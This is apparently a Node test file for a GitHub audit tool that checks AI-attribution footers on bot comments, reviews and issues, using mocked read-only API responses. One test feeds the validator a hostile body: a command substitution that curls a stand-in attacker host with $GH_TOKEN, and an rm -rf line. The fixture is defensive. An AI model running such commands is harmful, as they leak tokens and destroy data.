/**
 * Exercises the AI-workflow attribution audit with deterministic GitHub API
 * responses, including no-op reviews, edited output, provenance mismatches,
 * pagination boundaries, and shell-shaped untrusted bodies.
 */

import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { readFileSync } from "node:fs";
import { describe, it } from "node:test";
import { gunzipSync } from "node:zlib";

import {
  collectRepositoryRecords,
  createAuditSnapshot,
  createGithubReader,
  decodeSnapshot,
  encodeSnapshot,
  findWorkflowMutations,
  validateWorkflowMutations,
  verifyAuditSnapshot,
} from "./audit-ai-workflow-output.mjs";

const EXPECTED = {
  provider: "Anthropic",
  model: "claude-sonnet-4-6",
  client: "claude-code-action",
  skillRevision:
    "N/A - automated SKILL.md review does not invoke the contribution skill",
  lane: "skill-review-agent",
};
const AUTHOR = "github-actions[bot]";

function hash(body) {
  return createHash("sha256").update(body, "utf8").digest("hex");
}

function record({
  type = "issue-comment",
  id = 1,
  body = "",
  author = AUTHOR,
  number = 42,
}) {
  return {
    key: `${type}:${id}`,
    type,
    id: String(id),
    number,
    body,
    bodyHash: hash(body),
    author,
    authorType: author.endsWith("[bot]") ? "Bot" : "User",
    createdAt: "2026-07-30T20:00:01Z",
    updatedAt: "2026-07-30T20:00:01Z",
    url: `https://github.com/elizaOS/eliza/issues/${number}#${type}-${id}`,
  };
}

function machineFooter(overrides = {}) {
  const values = { ...EXPECTED, ...overrides };
  const providerSlug = values.provider
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "-");
  return `Review finding.

AI provider/model: ${values.provider} / ${values.model}
Client / agent tooling: ${values.client}
Contribution skill revision: ${values.skillRevision}
Attribution status: self-reported
— [${values.lane}]
<!-- eliza-computer-attribution:v1 {"provider":"${providerSlug}","model":"${values.model}","client":"${values.client}","skill_revision":"${values.skillRevision}"} -->`;
}

function issueBody() {
  return `## Contribution provenance

- AI assistance: yes
- AI provider/model: ${EXPECTED.provider} / ${EXPECTED.model}
- Client / agent tooling: ${EXPECTED.client}
- Contribution skill revision: ${EXPECTED.skillRevision}
- Attribution status: self-reported

## Finding

Weekly maintenance found an actionable dependency update.

— [${EXPECTED.lane}]
<!-- eliza-computer-attribution:v1 {"provider":"anthropic","model":"${EXPECTED.model}","client":"${EXPECTED.client}","skill_revision":"${EXPECTED.skillRevision}"} -->`;
}

function snapshot(records = [], overrides = {}) {
  return {
    version: 1,
    repository: "elizaOS/eliza",
    scope: "target",
    number: 42,
    capturedAt: "2026-07-30T20:00:00Z",
    windowStart: "2026-07-30T19:59:00Z",
    records: records.map(({ key, bodyHash }) => ({ key, bodyHash })),
    ...overrides,
  };
}

function jsonResponse(value, status = 200) {
  return new Response(JSON.stringify(value), {
    status,
    headers: { "content-type": "application/json" },
  });
}

describe("AI workflow attribution audit", () => {
  it("accepts a true no-op and ignores concurrent human comments", async () => {
    const baseline = record({
      id: 1,
      body: "Existing human discussion",
      author: "alice",
    });
    const encoded = encodeSnapshot(snapshot([baseline]));
    const currentHuman = record({
      id: 2,
      body: "A concurrent human reply",
      author: "bob",
    });
    const fetchImpl = async (url, options) => {
      assert.equal(options.method, "GET");
      if (url.pathname.endsWith("/issues/42")) {
        return jsonResponse({
          number: 42,
          body: null,
          user: { login: "alice", type: "User" },
          created_at: "2026-01-01T00:00:00Z",
          updated_at: "2026-07-30T20:00:01Z",
          html_url: "https://github.com/elizaOS/eliza/pull/42",
          pull_request: {},
        });
      }
      if (url.pathname.endsWith("/issues/42/comments")) {
        return jsonResponse([
          {
            id: 1,
            body: baseline.body,
            user: { login: "alice", type: "User" },
            issue_url: "https://api.github.com/repos/elizaOS/eliza/issues/42",
            created_at: baseline.createdAt,
            updated_at: baseline.updatedAt,
            html_url: baseline.url,
          },
          {
            id: 2,
            body: currentHuman.body,
            user: { login: "bob", type: "User" },
            issue_url: "https://api.github.com/repos/elizaOS/eliza/issues/42",
            created_at: currentHuman.createdAt,
            updated_at: currentHuman.updatedAt,
            html_url: currentHuman.url,
          },
        ]);
      }
      if (
        url.pathname.endsWith("/pulls/42/reviews") ||
        url.pathname.endsWith("/pulls/42/comments")
      ) {
        return jsonResponse([]);
      }
      return jsonResponse({ message: "unexpected" }, 404);
    };

    const result = await verifyAuditSnapshot({
      encodedSnapshot: encoded,
      token: "test-token",
      expectedAuthors: [AUTHOR],
      expected: EXPECTED,
      fetchImpl,
    });
    assert.equal(result.ok, true);
    assert.equal(result.noOp, true);
    assert.deepEqual(result.mutations, []);
  });

  it("retries read-only verification for API propagation before declaring a no-op", async () => {
    let commentReads = 0;
    const delays = [];
    const fetchImpl = async (url, options) => {
      assert.equal(options.method, "GET");
      if (url.pathname.endsWith("/issues/42")) {
        return jsonResponse({
          number: 42,
          body: null,
          user: { login: "alice", type: "User" },
          created_at: "2026-01-01T00:00:00Z",
          updated_at: "2026-07-30T20:00:01Z",
          html_url: "https://github.com/elizaOS/eliza/pull/42",
          pull_request: {},
        });
      }
      if (url.pathname.endsWith("/issues/42/comments")) {
        commentReads += 1;
        return jsonResponse(
          commentReads === 1
            ? []
            : [
                {
                  id: 3,
                  body: machineFooter(),
                  user: { login: AUTHOR, type: "Bot" },
                  issue_url:
                    "https://api.github.com/repos/elizaOS/eliza/issues/42",
                  created_at: "2026-07-30T20:00:01Z",
                  updated_at: "2026-07-30T20:00:01Z",
                  html_url:
                    "https://github.com/elizaOS/eliza/pull/42#issuecomment-3",
                },
              ],
        );
      }
      if (
        url.pathname.endsWith("/pulls/42/reviews") ||
        url.pathname.endsWith("/pulls/42/comments")
      ) {
        return jsonResponse([]);
      }
      return jsonResponse({ message: "unexpected" }, 404);
    };
    const result = await verifyAuditSnapshot({
      encodedSnapshot: encodeSnapshot(snapshot()),
      token: "test-token",
      expectedAuthors: [AUTHOR],
      expected: EXPECTED,
      fetchImpl,
      settleAttempts: 2,
      settleDelayMs: 25,
      delayImpl: async (milliseconds) => {
        delays.push(milliseconds);
      },
    });
    assert.equal(result.ok, true);
    assert.equal(result.noOp, false);
    assert.equal(result.mutations.length, 1);
    assert.deepEqual(delays, [25]);
  });

  it("validates every new or edited bot-authored record", () => {
    const old = record({ id: 1, body: "Old progress text" });
    const edited = record({ id: 1, body: machineFooter() });
    const created = record({
      type: "review-comment",
      id: 2,
      body: machineFooter(),
    });
    const mutations = findWorkflowMutations(
      snapshot([old]),
      new Map([
        [edited.key, edited],
        [created.key, created],
      ]),
      [AUTHOR],
      EXPECTED.lane,
    );
    assert.deepEqual(
      mutations.map((entry) => entry.key),
      ["issue-comment:1", "review-comment:2"],
    );
    assert.deepEqual(validateWorkflowMutations(mutations, EXPECTED), {
      ok: true,
      findings: [],
    });
  });

  it("rejects missing, human-only, mismatched, and wrong-lane provenance", () => {
    const bodies = [
      "Automated review without attribution.",
      "AI assistance: no - human-only review\nAttribution status: self-reported",
      machineFooter({ model: "claude-opus-4-7" }),
      machineFooter({ lane: "another-agent" }),
    ];
    const result = validateWorkflowMutations(
      bodies.map((body, index) => record({ id: index + 1, body })),
      EXPECTED,
    );
    assert.equal(result.ok, false);
    assert.equal(result.findings.length, 4);
    assert.ok(
      result.findings.some((finding) =>
        finding.errors.some((error) => /machine attribution/i.test(error)),
      ),
    );
    assert.ok(
      result.findings.some((finding) =>
        finding.errors.some((error) => /model must be/i.test(error)),
      ),
    );
    assert.ok(
      result.findings.some((finding) =>
        finding.errors.some((error) => /must carry lane/i.test(error)),
      ),
    );
  });

  it("validates machine-attributed issue bodies with issue semantics", () => {
    const createdIssue = record({
      type: "issue-body",
      id: 77,
      number: 77,
      body: issueBody(),
    });
    const mutations = findWorkflowMutations(
      snapshot([], { scope: "repository", number: undefined }),
      new Map([[createdIssue.key, createdIssue]]),
      [AUTHOR],
      EXPECTED.lane,
    );
    assert.equal(mutations.length, 1);
    assert.equal(validateWorkflowMutations(mutations, EXPECTED).ok, true);
  });

  it("does not mistake an old bot-created issue updated by new discussion for a new workflow issue", () => {
    const oldBotIssue = {
      ...record({
        type: "issue-body",
        id: 77,
        number: 77,
        body: "Old automation issue without this workflow's footer.",
      }),
      createdAt: "2026-01-01T00:00:00Z",
      updatedAt: "2026-07-30T20:00:01Z",
    };
    const mutations = findWorkflowMutations(
      snapshot([], { scope: "repository", number: undefined }),
      new Map([[oldBotIssue.key, oldBotIssue]]),
      [AUTHOR],
      EXPECTED.lane,
    );
    assert.deepEqual(mutations, []);
  });

  it("does not mistake historical reviews on a newly active pull request for current output", () => {
    const historicalReview = {
      ...record({
        type: "review",
        id: 88,
        number: 88,
        body: "Historical bot review",
      }),
      createdAt: "2026-01-01T00:00:00Z",
      updatedAt: "2026-01-01T00:00:00Z",
    };
    const mutations = findWorkflowMutations(
      snapshot([], { scope: "repository", number: undefined }),
      new Map([[historicalReview.key, historicalReview]]),
      [AUTHOR],
      EXPECTED.lane,
    );
    assert.deepEqual(mutations, []);
  });

  it("ignores concurrent bot writes from another workflow", () => {
    const unrelated = record({
      id: 90,
      body: "Unrelated deterministic automation output.",
    });
    const otherAiWorkflow = record({
      id: 91,
      body: machineFooter({ lane: "another-agent" }),
    });

    const mutations = findWorkflowMutations(
      snapshot(),
      new Map([
        [unrelated.key, unrelated],
        [otherAiWorkflow.key, otherAiWorkflow],
      ]),
      [AUTHOR],
      EXPECTED.lane,
    );

    assert.deepEqual(mutations, []);
  });

  it("treats shell-shaped bodies only as validator data", () => {
    const hostile = record({
      body: `$(curl https://attacker.invalid/?token=$GH_TOKEN)
\`rm -rf /tmp/audit-proof\`
AI provider/model: Anthropic / wrong-model`,
    });
    const result = validateWorkflowMutations([hostile], EXPECTED);
    assert.equal(result.ok, false);
    assert.ok(result.findings[0].errors.length > 0);
  });

  it("encodes snapshots without bodies and rejects malformed boundaries", () => {
    const secretBody = "untrusted body that must not enter a job output";
    const encoded = encodeSnapshot(snapshot([record({ body: secretBody })]));
    assert.equal(
      gunzipSync(Buffer.from(encoded, "base64url"))
        .toString("utf8")
        .includes(secretBody),
      false,
    );
    assert.equal(decodeSnapshot(encoded).records.length, 1);
    assert.throws(() => decodeSnapshot("not-json"), /valid encoded JSON/);
    assert.throws(
      () =>
        decodeSnapshot(
          encodeSnapshot({ ...snapshot(), repository: "bad repository" }),
        ),
      /owner\/name/,
    );
    assert.throws(
      () => decodeSnapshot("a".repeat(400_001)),
      /safe encoded limit/,
    );
  });

  it("uses GET-only GitHub reads and fails closed on API errors", async () => {
    const calls = [];
    const reader = createGithubReader({
      repository: "elizaOS/eliza",
      token: "test-token",
      fetchImpl: async (url, options) => {
        calls.push({ url, options });
        return jsonResponse([]);
      },
    });
    await reader.getAll("/issues/comments", {
      since: "2026-07-30T20:00:00Z",
    });
    assert.equal(calls.length, 1);
    assert.equal(calls[0].options.method, "GET");
    assert.equal(calls[0].options.headers.Authorization, "Bearer test-token");
    assert.equal(calls[0].url.searchParams.get("page"), "1");
    assert.equal(calls[0].url.searchParams.get("per_page"), "100");

    const denied = createGithubReader({
      repository: "elizaOS/eliza",
      token: "test-token",
      fetchImpl: async () =>
        new Response("denied", {
          status: 403,
          headers: { "x-github-request-id": "request-1" },
        }),
    });
    await assert.rejects(
      denied.get("/issues/42"),
      /failed with 403 \(request request-1\)/,
    );
  });

  it("paginates GET-only reads without accepting a truncated baseline", async () => {
    const calls = [];
    const reader = createGithubReader({
      repository: "elizaOS/eliza",
      token: "test-token",
      fetchImpl: async (url, options) => {
        calls.push({ url, options });
        const page = Number(url.searchParams.get("page"));
        return jsonResponse(
          page === 1
            ? Array.from({ length: 100 }, (_value, index) => ({
                id: index + 1,
              }))
            : [{ id: 101 }],
        );
      },
    });
    const values = await reader.getAll("/issues/comments");
    assert.equal(values.length, 101);
    assert.deepEqual(
      calls.map((call) => call.url.searchParams.get("page")),
      ["1", "2"],
    );
    assert.ok(calls.every((call) => call.options.method === "GET"));
  });

  it("collects repository issue bodies, conversation comments, reviews, and inline comments", async () => {
    const calls = [];
    const reader = createGithubReader({
      repository: "elizaOS/eliza",
      token: "test-token",
      fetchImpl: async (url, options) => {
        calls.push({ url, options });
        if (url.pathname.endsWith("/issues")) {
          return jsonResponse([
            {
              number: 7,
              body: issueBody(),
              user: { login: AUTHOR, type: "Bot" },
              created_at: "2026-07-30T20:00:01Z",
              updated_at: "2026-07-30T20:00:01Z",
              html_url: "https://github.com/elizaOS/eliza/issues/7",
            },
            { number: 9, pull_request: {} },
          ]);
        }
        if (url.pathname.endsWith("/issues/comments")) {
          return jsonResponse([
            {
              id: 10,
              body: machineFooter(),
              user: { login: AUTHOR, type: "Bot" },
              issue_url: "https://api.github.com/repos/elizaOS/eliza/issues/9",
              created_at: "2026-07-30T20:00:01Z",
              updated_at: "2026-07-30T20:00:01Z",
              html_url:
                "https://github.com/elizaOS/eliza/pull/9#issuecomment-10",
            },
          ]);
        }
        if (url.pathname.endsWith("/pulls/comments")) {
          return jsonResponse([
            {
              id: 11,
              body: machineFooter(),
              user: { login: AUTHOR, type: "Bot" },
              pull_request_url:
                "https://api.github.com/repos/elizaOS/eliza/pulls/9",
              created_at: "2026-07-30T20:00:01Z",
              updated_at: "2026-07-30T20:00:01Z",
              html_url:
                "https://github.com/elizaOS/eliza/pull/9#discussion_r11",
            },
          ]);
        }
        if (url.pathname.endsWith("/pulls/9/reviews")) {
          return jsonResponse([
            {
              id: 12,
              body: machineFooter(),
              user: { login: AUTHOR, type: "Bot" },
              submitted_at: "2026-07-30T20:00:01Z",
              html_url:
                "https://github.com/elizaOS/eliza/pull/9#pullrequestreview-12",
            },
          ]);
        }
        return jsonResponse({ message: "unexpected" }, 404);
      },
    });
    const records = await collectRepositoryRecords(
      reader,
      "2026-07-30T19:59:00Z",
    );
    assert.deepEqual([...records.values()].map((entry) => entry.type).sort(), [
      "issue-body",
      "issue-comment",
      "review",
      "review-comment",
    ]);
    assert.ok(calls.every((call) => call.options.method === "GET"));
  });

  it("creates a target snapshot only after reading the trusted baseline", async () => {
    const clock = [
      new Date("2026-07-30T20:00:00Z"),
      new Date("2026-07-30T20:00:02Z"),
    ];
    const fetchImpl = async (url) => {
      if (url.pathname.endsWith("/issues/42")) {
        return jsonResponse({
          number: 42,
          body: "Existing issue",
          user: { login: "alice", type: "User" },
          created_at: "2026-01-01T00:00:00Z",
          updated_at: "2026-01-01T00:00:00Z",
          html_url: "https://github.com/elizaOS/eliza/issues/42",
        });
      }
      if (url.pathname.endsWith("/issues/42/comments")) return jsonResponse([]);
      return jsonResponse({ message: "unexpected" }, 404);
    };
    const created = await createAuditSnapshot({
      repository: "elizaOS/eliza",
      scope: "target",
      number: 42,
      token: "test-token",
      fetchImpl,
      now: () => clock.shift(),
    });
    assert.equal(created.capturedAt, "2026-07-30T20:00:02.000Z");
    assert.equal(created.windowStart, "2026-07-30T19:59:00.000Z");
    assert.equal(created.records.length, 1);
    assert.equal("body" in created.records[0], false);
  });
});

describe("AI workflow audit integration", () => {
  const paths = [
    ".github/workflows/claude.yml",
    ".github/workflows/weekly-maintenance.yml",
  ];
  const workflow = (path) =>
    readFileSync(new URL(`../${path}`, import.meta.url), "utf8");

  it("captures a boundary and runs a separate read-only audit job", () => {
    for (const path of paths) {
      const source = workflow(path);
      assert.match(source, /id:\s*attribution-boundary/);
      assert.match(source, /audit-ai-workflow-output\.mjs snapshot/);
      assert.match(source, /^\s*audit-attribution:\s*$/m);
      assert.match(source, /audit-ai-workflow-output\.mjs verify/);
      assert.match(source, /ATTRIBUTION_AUDIT_SNAPSHOT:/);
      assert.match(source, /persist-credentials:\s*false/);
      const audit = source.slice(source.indexOf("\n  audit-attribution:"));
      assert.match(audit, /contents:\s*read/);
      assert.match(audit, /issues:\s*read/);
      assert.match(audit, /pull-requests:\s*read/);
      assert.doesNotMatch(audit, /contents:\s*write/);
      assert.doesNotMatch(audit, /issues:\s*write/);
      assert.doesNotMatch(audit, /pull-requests:\s*write/);
    }
  });

  it("disables unauditable progress comments and standardizes workflow identity", () => {
    for (const path of paths.slice(1)) {
      assert.doesNotMatch(workflow(path), /track_progress:\s*true/);
    }
    const weekly = workflow(paths[1]);
    assert.match(
      weekly,
      /github_token:\s*\$\{\{\s*secrets\.GITHUB_TOKEN\s*\}\}/,
    );
    assert.match(
      weekly,
      /ref:\s*\$\{\{\s*github\.event\.repository\.default_branch\s*\}\}/,
    );
    assert.doesNotMatch(weekly, /id-token:\s*write/);
    assert.doesNotMatch(weekly, /Bash\(gh issue \*\)|Bash\(gh pr \*\)/);
  });
});
